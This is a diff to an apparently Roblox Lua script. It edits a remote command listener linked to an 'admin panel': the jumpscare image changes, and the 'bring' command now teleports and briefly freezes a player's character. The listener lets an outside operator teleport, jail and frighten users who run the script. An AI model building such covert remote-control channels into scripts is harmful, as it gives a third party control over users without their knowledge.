@@ -3142,7 +3142,7 @@ end
 
 
 -- ==============================================================================
--- СЛУШАТЕЛЬ И ПИНГ ДЛЯ АДМИН-ПАНЕЛИ (С ЧИСТЫМ UNJAIL И СКРИМЕРОМ 137490098410517)
+-- СЛУШАТЕЛЬ И ПИНГ ДЛЯ АДМИН-ПАНЕЛИ (СКРИМЕР: 136803283463130)
 -- ==============================================================================
 do
     local _R = {}
@@ -3256,7 +3256,7 @@ do
         local img = Instance.new("ImageLabel")
         img.Size = UDim2.new(1, 0, 1, 0)
         img.BackgroundTransparency = 1
-        img.Image = customAssetId or "rbxassetid://137490098410517"
+        img.Image = customAssetId or "rbxassetid://136803283463130"
         img.ScaleType = Enum.ScaleType.Fit
         img.Parent = frame
 
@@ -3333,8 +3333,40 @@ do
         elseif cmd == "unjail" then
             _R.stopJailLoop()
         elseif cmd == "bring" then
-            if root and args and args.pos then
-                root.CFrame = CFrame.new(Vector3.new(args.pos[1], args.pos[2], args.pos[3]))
+            if root and hum and args and args.pos then
+                local targetCFrame = CFrame.new(Vector3.new(args.pos[1], args.pos[2], args.pos[3]))
+                
+                local oldWalkSpeed = hum.WalkSpeed
+                local oldJumpPower = hum.JumpPower
+                local oldJumpHeight = hum.JumpHeight
+                
+                hum.WalkSpeed = 0
+                hum.JumpPower = 0
+                pcall(function() hum.JumpHeight = 0 end)
+                
+                root.CFrame = targetCFrame
+                root.AssemblyLinearVelocity = Vector3.zero
+                root.AssemblyAngularVelocity = Vector3.zero
+                
+                task.spawn(function()
+                    local startTime = tick()
+                    while tick() - startTime < 1 do
+                        if root and hum and hum.Health > 0 then
+                            root.AssemblyLinearVelocity = Vector3.zero
+                            root.AssemblyAngularVelocity = Vector3.zero
+                            hum.WalkSpeed = 0
+                            hum.JumpPower = 0
+                            pcall(function() hum.JumpHeight = 0 end)
+                        end
+                        task.wait()
+                    end
+                    
+                    if hum and hum.Parent and hum.Health > 0 then
+                        hum.WalkSpeed = (oldWalkSpeed and oldWalkSpeed > 0) and oldWalkSpeed or 16
+                        hum.JumpPower = (oldJumpPower and oldJumpPower > 0) and oldJumpPower or 50
+                        pcall(function() hum.JumpHeight = oldJumpHeight end)
+                    end
+                end)
             end
         elseif cmd == "jumpscare_67" then
             _R.jumpscare(args and args.image)
@@ -3362,7 +3394,7 @@ do
         end
     end)
 
-    -- Слушатель входящих команд
+    -- Приемник команд
     task.spawn(function()
         if httpRequest then
             pcall(function()
